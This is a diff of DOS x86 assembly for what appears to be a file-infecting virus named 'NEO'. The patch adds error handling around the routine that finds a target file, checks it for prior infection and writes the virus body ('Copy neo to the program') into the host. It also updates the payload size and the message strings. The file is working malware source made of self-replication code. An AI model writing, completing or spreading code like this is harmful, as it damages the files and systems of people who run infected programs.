@@ -51,9 +51,34 @@ falso_proc:
 
 
 	; --- find first file ---
+	;clc ; clear carry
+	;stc
 	mov ah, 0x4e
 	xor cx, cx
 	lea dx, [bp + file_inf]
+	int 21h
+
+
+	lea cx, [bp + OPEN_FILE]
+	lea dx, [bp + F_N_FOUND]
+
+	cmovc cx, dx
+	jmp cx
+
+F_N_FOUND:
+
+        ; File not found
+        mov ah, 09h
+        mov dx, msg_no_file
+        int 21h
+
+        lea ax, [bp + EXIT]
+        jmp ax
+
+
+OPEN_FILE:
+	mov ah, 9h
+	mov dx, msg_file
 	int 21h
 
 	; --- Open file ---
@@ -65,6 +90,10 @@ falso_proc:
 
 	pop bx
 	push bx
+
+;==============================================
+; check if file is infected
+;==============================================
 
 	;read first 3 bytes
 	mov ax, 3f00h
@@ -111,7 +140,7 @@ falso_proc:
 	; Copy neo to the program
 	pop bx ; restore handle
 	mov ah, 40h
-	mov cx, 217d  ; 224 -7, remove exit. change this to actual size of neo
+	mov cx, 237d  ; 244 -7, remove exit. change this to actual size of neo
 	lea dx, [bp + NEO_BEGIN]
 	int 21h
 
@@ -120,7 +149,7 @@ falso_proc:
 	mov ah, 3eh
 	int 21h
 
-
+EXIT:
 	;=========================
 	mov ah, 09h
 	lea dx, [bp + msg_end]
@@ -145,7 +174,7 @@ section .data
 
 	jump_op db 'A', 0 
 
-	msg_file db "file found", "$", 0
+	msg_file db "file found", 0xd, 0xa, "$", 0
 	msg_end db "End of NEO", 0xd, 0xa, "$",0
-	msg_no_file db "No file found", "$", 0
+	msg_no_file db "No file found", 0xd, 0xa, "$", 0
 
